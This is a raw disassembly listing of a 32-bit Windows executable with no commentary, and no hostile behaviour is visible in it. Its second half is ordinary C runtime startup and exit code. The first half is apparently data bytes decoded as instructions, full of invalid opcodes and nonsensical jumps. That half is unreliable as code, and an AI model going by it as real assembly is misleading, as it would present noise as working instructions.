  4224b7:	lea    esp,[edx+edi*1+0x2d]
  4224bb:	push   ebx
  4224bc:	imul   esi,eax,0x2682b416
  4224c2:	inc    ebx
  4224c3:	fcomp  DWORD PTR [edx-0x2b1a8ad7]
  4224c9:	xchg   esp,eax
  4224ca:	push   es
  4224cb:	jmp    0x279e:0xe8146cf8
  4224d2:	outs   dx,DWORD PTR ds:[esi]
  4224d3:	leave  
  4224d4:	mov    ecx,0x1e47634d
  4224d9:	dec    ebp
  4224da:	scas   al,BYTE PTR es:[edi]
  4224db:	sbb    eax,0x1c58514e
  4224e0:	add    al,0xdd
  4224e2:	or     ebx,ecx
  4224e4:	pop    ds
  4224e5:	outs   dx,DWORD PTR ds:[esi]
  4224e6:	jmp    0x42253e
  4224e8:	das    
  4224e9:	outs   dx,BYTE PTR ds:[esi]
  4224ea:	retf   
  4224eb:	jmp    0xc5d2b1f4
  4224f0:	data16 ins BYTE PTR es:[edi],dx
  4224f2:	pop    ebp
  4224f3:	imul   ebx,DWORD PTR [esi+0x2f4b327a],0xffffffca
  4224fa:	mov    al,ds:0xbc84f904
  4224ff:	jno    0x42248b
  422501:	call   0x66cd:0xda650c48
  422508:	imul   edi,ecx,0x78
  42250b:	mov    dl,0xb1
  42250d:	ss push eax
  42250f:	(bad)  
  422510:	mov    eax,0xe2619d77
  422515:	repnz or ah,cl
  422518:	cli    
  422519:	inc    ecx
  42251a:	mov    ch,0xab
  42251c:	hlt    
  42251d:	mov    eax,0x313407a6
  422522:	sbb    al,0x5
  422524:	mov    ebp,0x686c8c39
  422529:	cwde   
  42252a:	inc    esp
  42252b:	or     esi,ebp
  42252d:	xor    ebx,DWORD PTR [ebx-0x2]
  422530:	ficomp WORD PTR [esi-0x63e4fc0f]
  422536:	iret   
  422537:	jmp    0xff68:0xdd807ff2
  42253e:	jb     0x42254f
  422540:	add    al,0x27
  422542:	and    al,0xfc
  422544:	push   esp
  422545:	sub    BYTE PTR [eax+0x72],bh
  422548:	in     ax,0x4
  42254b:	cwde   
  42254c:	ss ss rol ebp,0xd
  422551:	mov    esi,0x72a939c5
  422556:	das    
  422557:	jecxz  0x42256a
  422559:	and    eax,0x64da9a29
  42255e:	add    ah,BYTE PTR [ebx-0x474cbb3b]
  422564:	xchg   esi,eax
  422565:	dec    ecx
  422566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422567:	fsub   QWORD PTR [ecx+0x35]
  42256a:	mov    ds:0xa93908d2,eax
  42256f:	inc    esp
  422570:	ficomp WORD PTR [edx]
  422572:	stos   DWORD PTR es:[edi],eax
  422573:	add    BYTE PTR [eax+0x34],0xc4
  422577:	ss and eax,0xfa0fd125
  42257d:	push   esi
  42257e:	xchg   esp,esp
  422580:	jnp    0x42252d
  422582:	mov    esp,0xf4310b3
  422587:	cmp    cl,ch
  422589:	sbb    BYTE PTR [ecx+edi*2+0x2dad329d],0x18
  422591:	pop    ebx
  422592:	push   esp
  422593:	hlt    
  422594:	cmp    al,0x24
  422596:	inc    esi
  422597:	loop   0x422551
  422599:	fwait
  42259a:	ins    DWORD PTR es:[edi],dx
  42259b:	dec    ecx
  42259c:	repz sub DWORD PTR [ecx+0x2b],edi
  4225a0:	call   0x109:0x7f3c1451
  4225a7:	mov    dh,0x21
  4225a9:	mov    ebx,0x29a17e3c
  4225ae:	or     edi,DWORD PTR [eax]
  4225b0:	mov    WORD PTR [ecx],?
  4225b2:	mov    BYTE PTR [ebx],ch
  4225b4:	sar    DWORD PTR [edi+0x51dafad4],cl
  4225ba:	add    al,0x4e
  4225bc:	mov    BYTE PTR [ecx-0x420e6a7],bl
  4225c2:	outs   dx,BYTE PTR ds:[esi]
  4225c3:	out    0xb4,al
  4225c5:	sub    ah,BYTE PTR ds:0xad7aad6e
  4225cb:	push   ecx
  4225cc:	add    ah,BYTE PTR [ecx-0x5469beaa]
  4225d2:	in     eax,dx
  4225d3:	fild   DWORD PTR [ecx-0x6c2c270c]
  4225d9:	test   DWORD PTR [ebx-0x247dd6ba],0xf66d39d
  4225e3:	jp     0x422574
  4225e5:	dec    esp
  4225e6:	aaa    
  4225e7:	push   esp
  4225e8:	inc    esp
  4225e9:	adc    bl,BYTE PTR [ecx]
  4225eb:	ret    
  4225ec:	(bad)  
  4225ed:	sbb    BYTE PTR fs:[ebx-0xa],cl
  4225f1:	mov    eax,0x1cfd06d0
  4225f6:	in     eax,dx
  4225f7:	es ins BYTE PTR es:[edi],dx
  4225f9:	mov    cl,0x39
  4225fb:	rcr    DWORD PTR [edx-0x10],0x84
  4225ff:	fild   DWORD PTR [ebx]
  422601:	pop    eax
  422602:	lea    esp,[eax+0x43]
  422605:	jmp    0x5407:0xf085e70e
  42260c:	rcr    ebp,cl
  42260e:	retf   
  42260f:	mov    ah,0x93
  422612:	out    0xb3,al
  422614:	pop    edi
  422615:	lea    ebp,[ecx+0x3f]
  422618:	rol    al,cl
  42261a:	mov    eax,ebp
  42261c:	add    al,0x21
  42261e:	call   0xa73be8e5
  422623:	call   0x3ab3:0xee9a2487
  42262a:	(bad)  
  42262c:	fucomip st,st(0)
  42262e:	pop    ebp
  42262f:	push   0xfcad44a4
  422634:	add    BYTE PTR [edx+0x77a7064a],ah
  42263a:	aaa    
  42263b:	xor    al,0xa3
  42263d:	mov    ds:0xcfcafb54,al
  422642:	dec    ecx
  422643:	cmc    
  422644:	aam    0x8b
  422646:	xbegin 0xa202b33c
  42264c:	daa    
  42264d:	(bad)  
  42264e:	mov    eax,0x46882265
  422653:	sbb    esp,DWORD PTR [esp+ecx*2+0x116648d8]
  42265a:	adc    ecx,DWORD PTR [ebx+ebp*1]
  42265d:	retf   
  42265e:	push   ebp
  42265f:	inc    edx
  422660:	ins    DWORD PTR es:[edi],dx
  422661:	out    dx,al
  422662:	jg     0x42269a
  422664:	ins    BYTE PTR es:[edi],dx
  422665:	xlat   BYTE PTR ds:[ebx]
  422666:	dec    edi
  422667:	gs cmp al,0x58
  42266a:	inc    esp
  42266b:	iret   
  42266c:	mov    bh,0x59
  42266f:	stos   DWORD PTR es:[edi],eax
  422670:	int    0xf6
  422672:	rol    BYTE PTR [ebp+0x505f8b60],0x4e
  422679:	(bad)  
  42267a:	xchg   edx,eax
  42267b:	nop
  42267c:	jae    0x422662
  42267e:	sbb    edi,DWORD PTR [ebx]
  422680:	mov    edx,0xc03a2d35
  422685:	jnp    0x4226e4
  422687:	mov    cl,0x56
  422689:	leave  
  42268a:	ins    BYTE PTR es:[edi],dx
  42268b:	push   0x3ea78afd
  422690:	lock in eax,0x90
  422693:	inc    BYTE PTR [ecx+0x6dacb3dd]
  422699:	repnz ins DWORD PTR es:[edi],dx
  42269b:	adc    BYTE PTR [edi],dl
  42269d:	xor    eax,0x34448b8c
  4226a2:	fild   DWORD PTR [esp+edx*2]
  4226a5:	push   es
  4226a6:	pop    es
  4226a7:	sbb    edi,ebp
  4226a9:	xor    ch,BYTE PTR [ebx-0x28772af4]
  4226af:	lock push 0x45
  4226b2:	sbb    cl,BYTE PTR [esi-0x3b0e9955]
  4226b8:	pop    es
  4226b9:	fst    st(6)
  4226bb:	bound  edi,QWORD PTR [edx]
  4226bd:	in     eax,dx
  4226be:	rol    BYTE PTR [esi+0x312b656d],1
  4226c4:	cmp    al,0x9a
  4226c6:	mov    ecx,0xb304df49
  4226cb:	mov    bh,0xbe
  4226cd:	mov    edx,0x82dcf7fd
  4226d2:	fsub   DWORD PTR [ecx+0x105e7378]
  4226d8:	repz std 
  4226da:	dec    esp
  4226db:	das    
  4226dc:	push   ebp
  4226dd:	sar    bh,0x6e
  4226e0:	cmp    edx,DWORD PTR [edx]
  4226e2:	xchg   ecx,eax
  4226e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226e4:	xor    eax,0xbbc09ab5
  4226e9:	xchg   ebx,eax
  4226ea:	in     eax,dx
  4226eb:	in     eax,0x8b
  4226ed:	fadd   QWORD PTR [edx-0x6e]
  4226f0:	popf   
  4226f1:	mov    esi,cs
  4226f3:	retf   0xb5ff
  4226f6:	mov    dh,0xdd
  4226f8:	cld    
  4226f9:	clc    
  4226fa:	adc    DWORD PTR [esi],ecx
  4226fc:	mov    bl,0x34
  4226fe:	and    DWORD PTR [ecx+0x10cbacf9],edi
  422704:	adc    BYTE PTR [ebx+0x55e47488],ah
  42270a:	(bad)  
  42270b:	and    ah,bl
  42270d:	iret   
  42270e:	cmp    al,0x82
  422710:	or     cl,BYTE PTR [ebx-0x659914c9]
  422716:	mov    bl,0x56
  422718:	pusha  
  422719:	ins    BYTE PTR es:[edi],dx
  42271a:	shl    cl,cl
  42271c:	shr    dx,1
  42271f:	mov    cl,BYTE PTR [ecx+0x5ee1552c]
  422725:	mov    bl,0x1d
  422727:	sub    BYTE PTR [edx+0x21a481de],bl
  42272d:	test   BYTE PTR [ecx+0x5994aea0],bl
  422733:	cld    
  422734:	cdq    
  422735:	test   al,0x5
  422737:	dec    esp
  422738:	adc    DWORD PTR [ebx-0xc44edd2],eax
  42273e:	mov    cs,WORD PTR [edx+eax*2-0x59]
  422742:	mov    bh,0x82
  422744:	push   0x6cbb8424
  422749:	add    eax,0x8a36fcd6
  42274e:	jbe    0x4227bd
  422750:	in     al,0xe4
  422752:	idiv   DWORD PTR fs:0x30247919
  422759:	lods   al,BYTE PTR ds:[esi]
  42275a:	out    dx,al
  42275b:	mov    eax,ds:0x1799de7b
  422760:	in     eax,0x3
  422762:	lock or ebp,DWORD PTR [esi]
  422765:	aaa    
  422766:	push   edx
  422767:	ins    DWORD PTR es:[edi],dx
  422768:	sub    eax,0xa62d00e0
  42276d:	or     bh,BYTE PTR [esi+0x2b]
  422770:	in     al,0xcb
  422772:	les    ebx,FWORD PTR [ecx+edi*8+0x29]
  422776:	in     al,0x49
  422778:	mov    ecx,0xd4a786b1
  42277d:	fsubr  DWORD PTR [ebp-0x34ef6b63]
  422783:	pusha  
  422784:	dec    eax
  422785:	not    DWORD PTR [ebx]
  422787:	das    
  422788:	(bad)
  42278b:	je     0x42276b
  42278d:	jb     0x422767
  42278f:	jnp    0x422773
  422791:	pop    edi
  422792:	add    al,0x54
  422794:	test   ax,0xb13d
  422798:	pop    ds
  422799:	sub    ecx,esp
  42279b:	mul    BYTE PTR [ebp+0x3d]
  42279e:	and    DWORD PTR [ecx+0x6623ee6a],ebx
  4227a4:	pop    edi
  4227a5:	lock fimul WORD PTR ds:0x8a04760b
  4227ac:	cmp    DWORD PTR [edi+eiz*1+0x22],edx
  4227b0:	mov    ds:0xd109770c,al
  4227b5:	xchg   edx,eax
  4227b6:	repz adc al,0x51
  4227b9:	jns    0x4227a5
  4227bb:	addr16 xchg ebx,eax
  4227bd:	fnstsw WORD PTR [ebx-0x71bcc40c]
  4227c3:	mov    ecx,0xeacfc46d
  4227c8:	sub    bh,cl
  4227ca:	(bad)  
  4227cb:	mov    dh,0x38
  4227cd:	stos   DWORD PTR es:[edi],eax
  4227ce:	scas   al,BYTE PTR es:[edi]
  4227cf:	xchg   edx,eax
  4227d0:	mov    ecx,0x50330206
  4227d5:	add    ebx,esp
  4227d7:	pusha  
  4227d8:	sti    
  4227d9:	jb     0x4227cd
  4227db:	les    ebp,FWORD PTR [ebx+0x23f66b52]
  4227e1:	inc    ebp
  4227e2:	cmp    BYTE PTR [edx],bl
  4227e4:	xor    al,0x71
  4227e6:	mov    ah,0x17
  4227e8:	div    dl
  4227ea:	sub    al,0xbc
  4227ec:	mov    eax,0xd3207ea6
  4227f1:	jns    0x422820
  4227f3:	mov    ds:0x7b788672,al
  4227f8:	push   ebp
  4227f9:	add    esi,0x75d61375
  4227ff:	pop    ds
  422800:	sub    eax,0x8eb47b10
  422805:	xchg   edx,eax
  422806:	in     al,0xe9
  422808:	out    dx,al
  422809:	inc    ebx
  42280a:	mov    ch,0x10
  42280c:	mov    ah,0xc8
  42280e:	push   edi
  42280f:	enter  0x5872,0xdf
  422813:	or     eax,0x6a785018
  422818:	gs (bad) 
  42281a:	ficomp DWORD PTR [edx+eax*8]
  42281d:	jecxz  0x422891
  42281f:	ins    BYTE PTR es:[edi],dx
  422820:	rol    DWORD PTR [eax],cl
  422822:	pop    edx
  422823:	lods   eax,DWORD PTR ds:[esi]
  422824:	cmp    DWORD PTR [ebx],ebx
  422826:	mov    bh,0x88
  422828:	retf   0x415f
  42282b:	retf   
  42282c:	pusha  
  42282d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42282e:	xor    DWORD PTR [edx+0xcd958f7],esp
  422834:	iret   
  422835:	sub    DWORD PTR [edx-0x7f33274b],esi
  42283b:	inc    eax
  42283c:	es or  ch,cl
  42283f:	sahf   
  422840:	fist   DWORD PTR [esi-0x44]
  422843:	sbb    esi,edx
  422845:	repnz call 0x6c26:0x7162b481
  42284d:	out    0x47,al
  42284f:	enter  0x385b,0x34
  422853:	mov    dh,0x11
  422855:	sahf   
  422856:	jmp    0x2a30:0x3485f6fd
  42285d:	or     cl,dl
  42285f:	out    0x9d,eax
  422861:	sbb    dh,BYTE PTR [ecx+0x6d7ecce3]
  422867:	mov    cl,0xe4
  422869:	pushf  
  42286a:	add    ebp,esi
  42286c:	daa    
  42286d:	xchg   esi,eax
  42286e:	adc    al,0x9b
  422870:	in     al,0xf
  422872:	xor    ch,BYTE PTR [ebx-0x56447fda]
  422878:	(bad)  
  422879:	dec    esp
  42287a:	cmp    eax,0x269ca492
  42287f:	mov    edx,0x197cd485
  422884:	jmp    0x422875
  422886:	ret    
  422887:	int    0x71
  422889:	xchg   BYTE PTR [edi],bh
  42288b:	lds    ecx,FWORD PTR ds:0x8b2f7557
  422891:	or     esi,DWORD PTR [ebx+0x30c23ea0]
  422897:	in     eax,dx
  422898:	bound  eax,QWORD PTR [ecx-0x323abb4f]
  42289e:	fucom  st(2)
  4228a0:	retf   0x55d1
  4228a3:	lods   eax,DWORD PTR ds:[esi]
  4228a4:	sbb    eax,0xf386655a
  4228a9:	push   esi
  4228aa:	sbb    BYTE PTR [edi],ah
  4228ac:	fucom  st(2)
  4228ae:	pop    esp
  4228af:	sub    eax,ecx
  4228b1:	adc    bh,BYTE PTR [esi]
  4228b3:	push   esp
  4228b4:	pop    esp
  4228b5:	(bad)  
  4228b6:	(bad)  
  4228b7:	add    BYTE PTR [ecx],dh
  4228b9:	mov    ebx,edx
  4228bb:	icebp  
  4228bc:	sbb    ecx,DWORD PTR [esi-0x41fd75c6]
  4228c2:	dec    esp
  4228c3:	(bad)  
  4228c4:	and    esi,DWORD PTR [esi]
  4228c6:	and    DWORD PTR [edx],ebx
  4228c8:	pop    ds
  4228c9:	and    BYTE PTR [ebx+0x2183069b],dl
  4228cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228d0:	cmp    edi,ebx
  4228d2:	scas   eax,DWORD PTR es:[edi]
  4228d3:	mov    ch,0x15
  4228d5:	loope  0x422902
  4228d7:	inc    BYTE PTR [ebp-0x3e]
  4228da:	push   es
  4228db:	cmc    
  4228dc:	les    ebx,FWORD PTR [ebx-0x60]
  4228df:	xor    eax,0xcce03c33
  4228e4:	add    DWORD PTR [ebp+0x1b39c882],0xbd89ab89
  4228ee:	jmp    0x6acafa75
  4228f3:	sub    eax,eax
  4228f5:	mov    ch,0xa
  4228f7:	in     eax,0xb8
  4228f9:	(bad)  
  4228fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228fb:	ins    DWORD PTR es:[edi],dx
  4228fc:	iret   
  4228fd:	dec    edx
  4228fe:	sub    cl,BYTE PTR [ebp+edi*1+0x1c]
  422902:	out    0xf9,al
  422904:	mov    ah,0x85
  422906:	arpl   WORD PTR ds:0xaa19ee3a,bp
  42290c:	mov    BYTE PTR [edx-0x18],dl
  42290f:	push   ss
  422910:	cs ins DWORD PTR es:[edi],dx
  422912:	sbb    dh,BYTE PTR [ebx-0x66698042]
  422918:	and    al,0xd
  42291a:	inc    ebx
  42291b:	stos   DWORD PTR es:[edi],eax
  42291c:	sahf   
  42291d:	out    0x11,eax
  42291f:	sbb    al,0xa0
  422921:	std    
  422922:	push   ds
  422923:	ror    DWORD PTR [esi],0x58
  422926:	jae    0x4228bf
  422928:	imul   edi,DWORD PTR [edi-0x74],0x1f
  42292c:	mov    WORD PTR [eax-0x1410b7db],?
  422932:	sbb    edx,edi
  422934:	int3   
  422935:	js     0x42291b
  422937:	adc    DWORD PTR [edx],0x5c0091af
  42293d:	mov    dl,0xd3
  42293f:	ds cld 
  422941:	aad    0xa8
  422943:	jl     0x4228c6
  422945:	mov    eax,edi
  422947:	cmc    
  422948:	xchg   ebp,eax
  422949:	cmp    esi,esp
  42294b:	jb     0x4229c4
  42294d:	cmp    BYTE PTR [ebx+esi*4+0x470d422a],al
  422954:	and    dl,BYTE PTR [eax-0x531c80a5]
  42295a:	xor    eax,eax
  42295c:	add    esp,0x10
  42295f:	ret    0x10
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
